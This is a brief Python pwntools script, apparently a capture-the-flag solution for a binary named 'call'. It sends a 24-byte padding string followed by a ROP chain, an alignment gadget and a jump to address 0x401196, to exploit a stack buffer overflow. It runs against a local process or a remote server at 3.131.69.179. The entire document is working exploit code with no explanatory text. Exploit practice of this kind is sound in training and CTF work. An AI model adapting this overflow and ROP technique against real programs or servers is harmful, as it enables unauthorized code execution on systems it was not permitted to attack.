from pwn import *
import sys

argc = len(sys.argv)
_bin = "./call"
context.binary = _bin
e = ELF(_bin)
rop = ROP(e)
if argc >=2 and '-r' in sys.argv[1]:
    p = remote("3.131.69.179", 12345)
else:
    p = process("./call")

p.recvuntil(":")

# 16byte alignment
rop.raw(rop.find_gadget(['pop rsi', 'pop r15', 'ret']))
rop.raw(p64(0))
rop.raw(p64(0))
rop.raw(p64(0x401196))

offset = b"A"*24
payload = offset + rop.chain()

p.sendline(payload)
print(p.recvline())
